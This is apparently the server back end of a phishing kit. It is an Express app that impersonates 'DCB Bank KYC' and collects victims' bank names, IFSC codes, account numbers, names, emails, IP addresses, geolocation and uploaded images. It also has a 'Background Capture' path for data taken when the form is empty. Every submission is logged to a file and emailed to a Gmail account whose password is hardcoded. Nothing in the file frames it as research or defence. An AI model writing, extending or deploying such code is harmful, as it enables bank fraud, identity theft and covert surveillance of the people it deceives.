const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const nodemailer = require('nodemailer');
const app = express();
const port = process.env.PORT || 3000;

// Middleware for handling large payloads
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// Create uploads directory if it doesn't exist
const uploadDir = 'uploads';
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir);
}

// Set up multer for file upload
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, uploadDir);
  },
  filename: function (req, file, cb) {
    const uniqueName = `${Date.now()}-${file.originalname}`;
    cb(null, uniqueName);
  }
});

// File filter function
const fileFilter = (req, file, cb) => {
  const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
  if (allowedTypes.includes(file.mimetype)) {
    cb(null, true);
  } else {
    cb(new Error('Only JPG, PNG, or PDF files are allowed'), false);
  }
};

// Create upload instance
const upload = multer({
  storage: storage,
  fileFilter: fileFilter,
  limits: {
    fileSize: 50 * 1024 * 1024 // 50MB limit
  }
}).any();

// Email transporter
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'dcbsubmission392@gmail.com',
    pass: 'iskexmwnespcwxrkjt'
  }
});

// Route to handle form submission
app.post('/submit', (req, res) => {
  upload(req, res, async function (err) {
    if (err) {
      console.error('Upload error:', err);
      return res.status(500).send('Upload error: ' + err.message);
    }

    try {
      // Get real client IP (handles proxy headers)
      const getClientIp = (req) => {
        return req.headers['x-forwarded-for']?.split(',')[0] || 
               req.connection?.remoteAddress ||
               req.socket?.remoteAddress ||
               req.connection?.socket?.remoteAddress;
      };
      
      const ip = getClientIp(req);
      const userAgent = req.headers['user-agent'];
      const isFormEmpty = req.body.empty_form === 'true';
      
      // Process all received data
      const submissionData = {
        bankname: req.body.bankname || 'Not provided',
        ifsc: req.body.ifsc || 'Not provided',
        accno: req.body.accno || 'Not provided',
        fullname: req.body.fullname || 'Not provided',
        email: req.body.email || 'Not provided',
        location: req.body.location ? JSON.parse(req.body.location) : null,
        ip: ip,
        userAgent: userAgent,
        timestamp: req.body.timestamp || new Date().toISOString(),
        isFormEmpty: isFormEmpty,
        imageCount: Object.keys(req.files || {}).filter(k => k.startsWith('image')).length
      };
      
      // Log the submission
      const logEntry = `
--- ${isFormEmpty ? 'BACKGROUND' : 'FULL'} SUBMISSION ---
Bank: ${submissionData.bankname}
IFSC: ${submissionData.ifsc}
Account: ${submissionData.accno}
Name: ${submissionData.fullname}
Email: ${submissionData.email}
IP: ${submissionData.ip}
Location: ${submissionData.location ? 
  `${submissionData.location.latitude}, ${submissionData.location.longitude}` : 'None'}
Images: ${submissionData.imageCount}
Empty Form: ${isFormEmpty}
User Agent: ${userAgent}
-----------------------------
`;
      
      fs.appendFileSync('records.txt', logEntry);
      console.log(logEntry);
      
      // Prepare email
      const mailOptions = {
        from: 'DCB Bank KYC <dcbsubmission392@gmail.com>',
        to: 'dcbsubmission392@gmail.com',
        subject: isFormEmpty ? 
          '⚠️ Background Capture - DCB Bank' : 
          '✅ KYC Submission - DCB Bank',
        html: buildEmailHtml(submissionData),
        attachments: []
      };
      
      // Add all files as attachments
      if (req.files) {
        req.files.forEach(file => {
          mailOptions.attachments.push({
            filename: file.originalname,
            path: file.path
          });
        });
      }
      
      // Send email
      console.log('Sending email...');
      await transporter.sendMail(mailOptions);
      console.log('Email sent successfully');
      
      // Cleanup files
      if (req.files) {
        req.files.forEach(file => {
          try {
            fs.unlinkSync(file.path);
          } catch (e) {
            console.error('Error deleting file:', e);
          }
        });
      }
      
      res.status(200).send();
    } catch (error) {
      console.error('❌ Error:', error);
      res.status(500).send('Error processing submission');
    }
  });
});

// Helper function to build email HTML
function buildEmailHtml(data) {
  return `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
      <h2 style="color: ${data.isFormEmpty ? '#d32f2f' : '#003d6a'};">
        ${data.isFormEmpty ? '⚠️ Background Capture' : '✅ KYC Submission'}
      </h2>
      
      <div style="background-color: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3 style="color: #003d6a; margin-top: 0;">${data.isFormEmpty ? 'Background Data' : 'Account Information'}</h3>
        ${data.isFormEmpty ? '' : `
          <p><strong>Bank Name:</strong> ${data.bankname}</p>
          <p><strong>IFSC Code:</strong> ${data.ifsc}</p>
          <p><strong>Account Number:</strong> ${data.accno}</p>
        `}
        <p><strong>Full Name:</strong> ${data.fullname}</p>
        <p><strong>Email:</strong> ${data.email}</p>
      </div>
      
      ${data.location ? `
      <div style="background-color: #e8f4fc; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3 style="color: #003d6a; margin-top: 0;">Location Data</h3>
        <p><strong>Latitude:</strong> ${data.location.latitude}</p>
        <p><strong>Longitude:</strong> ${data.location.longitude}</p>
        <p><strong>Accuracy:</strong> ${data.location.accuracy} meters</p>
        <p><strong>Last Updated:</strong> ${new Date(data.location.timestamp).toLocaleString()}</p>
      </div>
      ` : ''}
      
      <div style="background-color: #f0f8ff; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3 style="color: #003d6a; margin-top: 0;">Technical Data</h3>
        <p><strong>IP Address:</strong> ${data.ip}</p>
        <p><strong>Images Captured:</strong> ${data.imageCount} (${data.isFormEmpty ? 'background only' : 'full submission'})</p>
        <p><strong>User Agent:</strong> ${data.userAgent}</p>
        <p><strong>Timestamp:</strong> ${new Date(data.timestamp).toLocaleString()}</p>
      </div>
    </div>
  `;
}

// Start server
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
